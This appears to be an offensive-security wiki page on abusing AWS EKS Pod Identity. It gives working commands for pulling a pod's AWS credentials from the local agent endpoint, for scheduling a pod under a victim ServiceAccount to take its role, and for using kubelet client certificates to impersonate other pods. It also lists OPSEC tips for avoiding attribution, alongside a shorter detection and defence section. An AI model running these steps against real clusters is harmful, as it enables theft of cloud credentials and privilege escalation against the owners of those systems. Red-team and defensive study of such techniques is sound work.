---
title: EKS Pod Identity abuse
slug: eks-pod-identity-abuse
---

> **TL;DR:** EKS Pod Identity (GA 2023) replaces IRSA. A node-local agent (`eks-pod-identity-agent`) issues credentials to pods over a link-local HTTP endpoint (`169.254.170.23`) using a pod-namespaced ServiceAccount. Attackers gaining a shell in any pod query that endpoint to assume the pod's role; mis-scoped trust policies and node-wide RBAC let them reach foreign pods' roles.

## What it is
Before Pod Identity, pods got AWS creds via IRSA (IAM Roles for Service Accounts) — OIDC trust to the EKS cluster's OIDC provider, projected JWT, STS `AssumeRoleWithWebIdentity`. Pod Identity simplifies this: the cluster runs a DaemonSet that listens on a link-local IP; pods making `GET /v1/credentials` over HTTP get short-lived creds. The agent uses `kubelet`-vouched identity (pod UID + SA) to choose the right role.

## Preconditions / where it applies
- EKS cluster with `eks-pod-identity-agent` installed (default for new clusters since 1.27)
- A pod with `EKS Pod Identity Association` to an IAM role
- Foothold in any pod, OR ability to schedule pods (RBAC `create pods`), OR host access on a worker node

## Tradecraft

**From inside any pod (HTTP, not HTTPS, no auth needed locally):**

```bash
# Service endpoint exposed by eks-pod-identity-agent
curl -H "Authorization: $(cat /var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token)" \
  http://169.254.170.23/v1/credentials
# Returns AccessKeyId/SecretAccessKey/Token JSON
```

Boto3 + the AWS SDK automatically resolve this when `AWS_CONTAINER_CREDENTIALS_FULL_URI` and `AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE` are set by the kubelet — they are, on Pod Identity pods.

**Pivot #1 — schedule a pod with a victim ServiceAccount you can use:**

```bash
# If RBAC allows create pods in target namespace
kubectl run pwn --image=alpine --serviceaccount=privileged-sa \
  --restart=Never -- sleep 9999
kubectl exec pwn -- sh -c 'curl http://169.254.170.23/v1/credentials'
```

This bypasses the original pod's network policies — your new pod simply inherits the SA's Pod Identity Association.

**Pivot #2 — host network on the worker node.** If you reach the underlying EC2 node (privileged pod, hostNetwork, or SSM session), the agent endpoint serves ALL associations for ALL pods on the host based on caller's pod UID. The trust check goes through `kubelet` API on `127.0.0.1:10250`:

```bash
# On the node
curl -k --cert apiserver-kubelet-client.crt --key apiserver-kubelet-client.key \
  https://127.0.0.1:10250/pods | jq '.items[].spec.serviceAccountName'
# Then craft a pod-id-agent request impersonating a privileged pod's UID
```

In practice, `eks-pod-identity-agent` consults Kubelet auth on each request, so this requires kubelet creds — but a hostPath-mount of `/var/lib/kubelet/pki/` from any privileged pod is enough.

**Pivot #3 — trust policy too broad.** Pod Identity associations bind an IAM role to `(cluster, namespace, serviceaccount)`. If the role's trust policy uses wildcard `eks.amazonaws.com` without conditioning on `kubernetes.io/namespace` or `kubernetes.io/serviceaccount`, any pod identity in any cluster sharing the principal can assume it:

```json
{"Effect":"Allow","Principal":{"Service":"pods.eks.amazonaws.com"},
 "Action":["sts:AssumeRole","sts:TagSession"],
 "Condition":{}}    // missing conditions = abusable
```

**Audit from outside:**

```bash
aws eks list-pod-identity-associations --cluster-name $C
aws eks describe-pod-identity-association --cluster-name $C --association-id $A
```

## Detection and defence
- CloudTrail `AssumeRoleForPodIdentity` events should appear ONLY from the cluster's known node-role principals — alert on any other invoker
- Trust policy MUST include both `kubernetes.io/namespace` and `kubernetes.io/serviceaccount-name` as conditions; check via `aws iam get-role`
- Kubernetes RBAC: deny `create pods` in privileged namespaces; use NetworkPolicy to deny `egress 169.254.170.23/32` from non-trusted pods (pods can override the local endpoint by SDK env — defense in depth, not a hard block)
- GuardDuty EKS Runtime Monitoring detects unexpected processes calling the credentials endpoint
- Rotate Pod Identity Associations as part of cluster lifecycle; orphaned associations from deleted SAs are common

## OPSEC pitfalls
- Every call to `169.254.170.23` is logged by the agent → CloudWatch via the cluster's logging config (if enabled). Most clusters DO enable EKS control-plane logs but NOT agent stdout
- IRSA + Pod Identity can coexist; some clusters still have legacy IRSA roles with overly-broad OIDC trust. Enumerate both
- STS calls from the cluster appear from the NAT gateway IP, not the pod IP — defenders attributing by source IP get the wrong pod

## References
- [EKS Pod Identity user guide](https://docs.aws.amazon.com/eks/latest/userguide/pod-identities.html)
- [aws/eks-pod-identity-agent](https://github.com/aws/eks-pod-identity-agent)
- [Snyk — EKS Pod Identity attack research](https://snyk.io/blog/)
- [Wiz — Pod Identity vs IRSA](https://www.wiz.io/blog/)

See also: [[k8s-service-account-tokens]], [[k8s-rbac-abuse]], [[k8s-privileged-pod]], [[aws-instance-metadata]], [[aws-sts-assume-role]], [[gcp-workload-identity-federation-abuse]], [[multi-cloud-pivoting]]
